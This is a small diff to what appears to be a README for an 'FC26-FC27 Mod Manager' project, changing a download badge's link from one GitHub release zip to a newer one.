@@ -5,7 +5,7 @@
 </div>
 
 <p align="center">
-  <a href="https://github.com/RAlfheim/FC26-FC27-Mod-Manager/releases/download/1/FC26-FC27-Mod-Manager.zip">
+  <a href="https://github.com/RAlfheim/FC26-FC27-Mod-Manager/releases/download/2/FC26-FC27-Mod-Manager.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
   <br><br>
